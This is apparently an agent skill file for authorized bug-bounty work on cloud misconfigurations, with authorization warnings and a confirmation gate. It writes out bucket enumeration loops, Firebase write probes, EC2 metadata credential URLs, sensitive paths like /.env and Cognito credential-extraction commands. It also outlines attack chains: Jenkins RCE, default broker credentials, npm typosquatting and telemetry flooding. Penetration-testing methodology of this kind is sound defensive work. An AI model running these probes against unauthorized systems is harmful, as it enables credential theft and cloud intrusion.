---
name: hunt-cloud-misconfig
description: Hunt cloud / infrastructure misconfigurations.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"AUTHORIZED_SYNTHETIC_MARKER"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

### Jenkins SSO-restriction failure → Script Console RCE
An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure. Disclosed: reports/231460.

### Exposed message broker (RabbitMQ / AMQP) with default creds
Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin. Disclosed: reports/753602.

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# Historic compatibility example, not a current license/support statement.
# Select a supported reviewed LocalStack release for a disposable lab.
docker run -d --name lab-localstack -p 127.0.0.1:14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Checksum compatibility is version-specific, not a universal failure rule. The referenced upstream verification file is not bundled; no reproducible local run is claimed here.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"][a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36}['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, an assessor may test only after explicit scope for temporary credentials and the exact minimal follow-up action:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
# Do not enumerate unrelated services; use the single approved canary resource/action.
# Broad permission enumeration is outside a minimal confirmation test.
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry data-handling review.** AWS-owned endpoints are not automatically trusted by every enterprise allowlist. Review whether telemetry can contain sensitive fields and whether egress/DLP policies inspect the payload. Use only a synthetic marker in an owned test monitor if a write test is explicitly authorized; never transmit stolen or production data to demonstrate a finding. Record monitor authorization, custom-event settings, retention and receiver access. Endpoint branding does not prove a blind spot.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), potentially affect downstream consumers if those consumers render event data unsafely (console XSS is not established by this bundle), and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Potentially critical** | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **Impact-dependent** | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **Impact-dependent** | Not sufficient alone: evaluate allowed resources, trust and executable service actions |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Impact-dependent** | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Impact-dependent** | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Impact-dependent** when verified | Persistent stored XSS across every customer page |

### Primary authorization reference

AWS documents Cognito unauthenticated identities scoped to rum:PutRumEvents as an intended configuration, and also supports public resource policies for event submission. Public identifiers or accepted telemetry alone are not proof of a vulnerability. Validate effective permissions and concrete impact under the engagement rules.

- https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CloudWatch-RUM-get-started-authorization.html
- https://docs.aws.amazon.com/en_en/AmazonCloudWatch/latest/monitoring/CloudWatch-RUM-resource-policies.html

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Review effective policies with the owner or test one explicitly approved canary action. Document unresolved policy/permission boundaries instead of broad enumeration.
6. Use a synthetic owned test resource if authorized. Lambda invocation is not read-only and must never be grouped with harmless listing.
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Instance metadata is normally reachable from its instance-local network context, subject to IMDS configuration and hop limits; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: a write test is permitted only when explicitly authorized; use a unique synthetic marker, verify exact scope/read-back and authorized cleanup. Otherwise report the limitation without writing.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
